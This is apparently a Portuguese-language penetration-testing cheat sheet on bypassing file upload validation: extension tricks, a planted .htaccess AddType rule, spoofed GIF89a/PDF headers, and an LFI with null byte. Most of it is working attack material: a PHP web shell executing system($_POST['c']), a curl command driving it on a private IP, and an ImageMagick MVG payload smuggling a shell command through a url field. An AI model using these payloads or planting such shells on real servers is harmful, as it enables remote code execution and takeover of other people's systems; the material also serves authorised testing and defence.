Upload Bypass ocorre quando é possível enviar arquivos até o servidor, e o servidor não faz a validação correta desses arquivos, assim podendo fazer o upload de um arquivo malicioso ou uma shell, existem vários jeitos de controlar o upload de arquivos, e também várias formas de contornar esse métodos

### Formas de Burlar
#### Extensão
É possível tentar alterar a extensão para ver se o servidor aceita através de outras formas, por exemplo: file.php -> file.pHp ou file.php -> file.php.pdf ou file.php -> file.php3. Caso utilize um file.php.pdf, será preciso de LFI e null byte é possível utilizar esse arquivo no formato PHP, por exemplo: 172.16.1.231/index.php?page=uploads/file.php.pdf%00&c=id

#### .htaccess
Caso o servidor não possua um controle do arquivo .htacess, é possível enviar um arquivo com qualquer extensão ao servidor, e depois enviar um arquivo chamado ".htaccess" com uma regra para que aquela extensão seja interpretada da maneira que você precisar, por exemplo: file.sec -> (AddType application/x-httpd-php .sec) no arquivo .htaccess

#### Conteúdo do arquivo
Algumas aplicações, verificam o conteúdo de dentro do arquivo para fazer o controle do upload, por exemplo em PDFs, na primeira linha existe um cabeçalho %PDF-1.5 para identificar que o arquivo é um PDF. Para arquivos GIFs, o cabeçalho é GIF89a

## PHP File

```php
%PDF-1.5 ou GIF89a
<?php
system($_POST['c']);
?>
```

```bash
curl http://172.30.0.40/_old/upload/file.php -d "c=id"
```

## JPG File

```jpg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"; sleep " 10)'
pop graphic-context
```